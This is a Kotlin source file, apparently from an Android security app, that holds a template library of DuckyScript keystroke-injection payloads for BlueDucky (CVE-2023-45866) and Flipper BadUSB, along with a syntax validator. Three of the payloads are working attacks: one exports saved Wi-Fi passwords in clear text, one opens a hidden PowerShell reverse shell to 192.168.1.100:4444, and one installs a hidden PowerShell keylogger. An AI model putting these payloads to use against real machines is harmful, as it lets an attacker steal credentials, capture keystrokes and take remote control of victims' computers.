package xin.ctkqiang.deauthctrl.manager

/**
 * BlueDucky 载荷工坊 —— DuckyScript 载荷模板库 + 生成器。
 * 手机无法以蓝牙 HID 外设注入(CVE-2023-45866 需 Linux/ESP32 硬件),
 * 本模块生成标准 DuckyScript 文本文件,供 BlueDucky / Flipper BadUSB 使用。
 */
object BlueDuckyPayloads {

    data class Payload(val id: String, val title: String, val script: String)

    private val _payloads = listOf(
        Payload(
            "wifi", "Wi-Fi 密码导出",
            """REM Target: Windows
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 600
STRING netsh wlan show profile name=* key=clear > %TEMP%\w.txt
ENTER
DELAY 600
STRING exit
ENTER""",
        ),
        Payload(
            "revshell", "PowerShell 反连 Shell",
            """REM Target: Windows · change IP first
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -c "${'$'}c=New-Object Net.Sockets.TCPClient('192.168.1.100',4444);${'$'}s=${'$'}c.GetStream();[byte[]]${'$'}b=0..65535|%{0};while((${'$'}i=${'$'}s.Read(${'$'}b,0,${'$'}b.Length)) -ne 0){${'$'}d=(New-Object -TypeName Text.ASCIIEncoding).GetString(${'$'}b,0,${'$'}i);${'$'}r=(iex ${'$'}d 2>&1|Out-String);${'$'}o=${'$'}r+'PS> ';${'$'}x=([text.encoding]::ASCII).GetBytes(${'$'}o);${'$'}s.Write(${'$'}x,0,${'$'}x.Length)}"
ENTER""",
        ),
        Payload(
            "wallpaper", "桌面嘲讽(无害)",
            """REM Target: any · harmless prank
DELAY 1000
GUI d
DELAY 500
GUI r
DELAY 300
STRING notepad
ENTER
DELAY 600
STRING you just got ducked
ENTER""",
        ),
        Payload(
            "keylog", "PowerShell 键盘记录",
            """REM Target: Windows · logs to %TEMP%
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -c "${'$'}p='%TEMP%\k.log';${'$'}sig='[DllImport(\"user32.dll\")] public static extern int GetAsyncKeyState(int i);';${'$'}t=Add-Type -MemberDefinition ${'$'}sig -Name 'K' -Namespace W -PassThru;while(${'$'}true){Start-Sleep -m 50;foreach(${'$'}k in 1..254){if(${'$'}t::GetAsyncKeyState(${'$'}k) -eq -32767){[char]${'$'}k|Out-File -Append ${'$'}p}}}"
ENTER""",
        ),
    )

    fun payloads(): List<Payload> = _payloads

    fun byId(id: String): Payload? = _payloads.firstOrNull { it.id == id }

    /** 简单校验:DUCKY 语法(REM/DELAY/STRING/GUI/ENTER)行占比;返回问题列表(空=通过) */
    fun validate(script: String): List<String> {
        val problems = mutableListOf<String>()
        val lines = script.lines().map { it.trim() }.filter { it.isNotEmpty() }
        if (lines.isEmpty()) problems += "空载荷"
        if (lines.firstOrNull()?.startsWith("REM") != true) problems += "建议首行 REM 注释"
        val known = setOf("REM", "DELAY", "STRING", "GUI", "ENTER", "TAB", "CTRL", "ALT", "SHIFT", "CAPSLOCK", "MENU", "PRINTSCREEN", "ESC", "UP", "DOWN", "LEFT", "RIGHT", "SPACE", "REPEAT", "DEFAULTDELAY", "HOLD", "RELEASE")
        lines.forEach { l ->
            val cmd = l.substringBefore(' ')
            if (!known.any { cmd.startsWith(it) } && !l.startsWith("\${'$'}")) problems += "未知指令: " + l
        }
        return problems
    }
}
